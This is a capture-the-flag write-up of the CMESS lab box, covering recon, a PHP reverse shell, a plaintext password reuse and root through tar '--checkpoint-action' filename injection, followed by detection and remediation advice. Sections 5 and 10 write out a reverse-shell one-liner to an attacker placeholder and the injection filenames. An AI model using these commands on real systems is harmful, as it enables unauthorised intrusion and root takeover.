# CMESS CTF — Writeup

> **Target:** `10.10.233.238` (cmess)
>
> **Author:** HawkSec38
>
> **Date:** 2025-09-29

---

## TL;DR

A vulnerable web application exposed developer content and backup artifacts that allowed remote command execution through an uploaded PHP reverse shell and a weakly protected backup password. From an initial `www-data` web shell, the box was escalated to user `andre` using a password found in `/opt/.password.bak`, and then to `root` by abusing a backup/restore process that interpreted attacker-controlled filenames as command-line options (using `--checkpoint` / `--checkpoint-action`). Both flags were captured.


---

## Table of Contents

1. Overview
2. Recon
3. Initial access (www-data)
4. Privilege escalation to `andre`
5. Privilege escalation to `root`
6. Root cause analysis
7. Artifacts & IOCs
8. Detection & Forensics
9. Remediation
10. Full command timeline (playbook)
11. Notes & responsible disclosure

---

## 1. Overview

This writeup documents the steps taken to compromise a host running Ubuntu 16.04 with Apache and OpenSSH. The box contained:

* A web application with developer messages and files accessible via HTTP.
* An exposed PHP reverse shell found inside developer content.
* A plain-text backup password stored at `/opt/.password.bak`.
* A backup/restore process that treated filenames as command-line arguments, enabling option injection.

The exploit chain:

1. Find PHP reverse shell in web content → get `www-data` shell.
2. Find `/opt/.password.bak` → SSH to `andre`.
3. Create files with names like `--checkpoint-action=exec=sh shell.sh` in a backup directory → backup process executes commands → root.

---

## 2. Recon

Key tools used (examples): `nmap`, `gobuster`, `wfuzz`/`ffuf`.

### Ports

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18
```

### Directory enumeration highlights

`gobuster` turned up paths including `/admin`, `/api`, `/dev`, `/cm`, and `/backup`-like content. A `wfuzz` (or `ffuf`) run discovered developer messages on a `dev` endpoint that contained a PHP reverse shell template and a temporary admin password.

Files of interest discovered on the webserver:

* Developer messages containing `php-reverse-shell` code
* `andre_backup.tar.gz` referenced in `/tmp`
* `/opt/.password.bak` (readable)

---

## 3. Initial access (www-data)

A PHP reverse shell extracted from developer messages was used to gain an initial shell. Example steps:

1. Start listener locally:

```bash
nc -lnvp 4444
```

2. Trigger the PHP reverse shell via HTTP (example payload was present in app developer messages).
3. Receive a connection from the target and confirm identity:

```bash
uname -a
id
# output showed: uid=33(www-data) gid=33(www-data)
```

4. Stabilize shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

---

## 4. Privilege escalation to `andre`

While enumerating the system, `/opt/.password.bak` was discovered and contained a password:

```
andres backup password
UQfsdCB7aAP6
```

Use the password to SSH as `andre`:

```bash
ssh andre@10.10.233.238
# password: UQfsdCB7aAP6
cat ~/user.txt

```

`andre` did not have sudo privileges.

---

## 5. Privilege escalation to `root`

A backup directory (`/home/andre/backup`) was writable by `andre`. The backup system erroneously interpreted filenames beginning with `--` as command-line options. The attack created three items in the `backup` directory:

* `shell.sh` (a script that creates a FIFO and connects back to attacker's listener)
* A file named `--checkpoint-action=exec=sh shell.sh` (this is interpreted as an option that executes `sh shell.sh`)
* A file named `--checkpoint=1`

Example `shell.sh` contents:

```bash
mkfifo /tmp/lhennp; nc <ATTACKER_IP> 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp
```

Then the attacker awaited a connection on their listener:

```bash
nc -lnvp 8888
```

When the backup/restore routine ran (or processed the attacker-created filenames), it treated `--checkpoint-action` as a valid option and executed the supplied `shell.sh`, giving a root shell

```
id
# uid=0(root) gid=0(root)
cat /root/root.txt

```

---

## 6. Root cause analysis

Primary root cause: **Option injection via unsanitized filenames** used by privileged backup/restore tooling. The backup process likely called `tar` or another CLI tool with untrusted filenames, allowing crafted filenames beginning with `--` to be parsed as options (like `--checkpoint-action=exec=sh shell.sh`).

Contributing issues:

* Sensitive credentials stored in world-readable files (`/opt/.password.bak`).
* Developer/debug content accessible via the public web app.
* Outbound connections allowed from the host (no egress filtering), facilitating reverse shells.

---

## 7. Artifacts & IOCs

Search for the following artifacts when hunting or doing incident response:

* Filenames beginning with `--checkpoint` or `--checkpoint-action`
* Files named `andre_backup.tar.gz` in `/tmp`
* `/opt/.password.bak` and its content
* Strings: `php-reverse-shell`, `pentestmonkey`
* Network connections from the host to unusual external ports (4444, 8888, etc.)

Example forensic commands:

```bash
grep -R "php-reverse-shell" /var/www /tmp /var/log 2>/dev/null
find / -name "--checkpoint*" 2>/dev/null
grep -R "UQfsdCB7aAP6|KPFTN_f2yxe%" /var/log/* 2>/dev/null
grep "andre" /var/log/auth.log
```

---

## 8. Detection & Forensics

* Inspect Apache access logs for requests to developer endpoints and any file upload or API endpoints.
* Verify `auth.log` for successful `andre` SSH logins.
* Look for processes invoking `tar` or other backup tools with option-like filenames.
* Use EDR/IDS rules to alert on creation of files with names starting with `--` in backup directories and on `nc`/`bash` usage by non-interactive users.

---

## 9. Remediation (practical)

1. **Fix scripts**: modify backup/restore scripts to *never* pass untrusted filenames directly into shell commands or third-party CLI without sanitization. Use:

```bash
# safest patterns
# 1) ensure use of `--` to stop option parsing before filenames
tar -cf /tmp/archive.tar -- -C /path/to/backup "${filename}"

# 2) better: work with file descriptors or lists and avoid shell interpolation
xargs -0 tar -cf /tmp/archive.tar --files-from - < /tmp/filelist
```

2. **Secure credentials**: remove world-readable password files; use a secrets vault or at minimum `chmod 600`.
3. **Harden web app**: remove dev/debug content from public endpoints; restrict dev endpoints by IP or authentication.
4. **Egress filtering**: block or monitor outbound connections from web servers to the Internet.
5. **Patch & upgrade**: Ubuntu 16.04 is old — upgrade OS and trim unnecessary services.
6. **Logging & alerts**: add alerts for suspicious filenames, `nc` usage, and tar invocations with checkpoint-options.

---

## 10. Full command timeline (playbook)

Below is a concise list of the key commands used during the engagement. Use this as a step-by-step playbook (replace IPs & paths as necessary).

```bash
# Recon
nmap -sV 10.10.233.238
gobuster dir -u http://10.10.233.238 -w /usr/share/wordlists/dirb/common.txt
# or ffuf

# Receive initial shell
nc -lnvp 4444
# trigger php reverse shell on webapp

# stabilize
python3 -c "import pty; pty.spawn('/bin/bash')"

# inspect
ls -la /tmp
cat /opt/.password.bak

# SSH as andre
ssh andre@10.10.233.238
# password: UQfsdCB7aAP6
cat ~/user.txt

# prepare root exploit on attacker side
nc -lnvp 8888
# on target (andre)
cd ~/backup
echo "mkfifo /tmp/lhennp; nc <ATTACKER_IP> 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
# create files with option-like names (these will be processed by backup script)
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

# wait for root shell back
# confirm
id
cat /root/root.txt
```

---

## 11. Notes & Responsible Disclosure

* This writeup is intended for educational purposes. Do not attempt to run these attacks against systems you do not own or have permission to test.
* If you are publishing this on GitHub: redact any real IPs, personal contact details, or organization names unless you have authorization.

---

## Credits & References

* Vulnerability pattern: **Option injection via filename** (common with `tar`/CLI tools)
* PHP reverse shell: pentestmonkey's php-reverse-shell (used as a test PoC)

---

### License

This writeup is released under the Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0). Feel free to reuse and adapt with attribution.

---

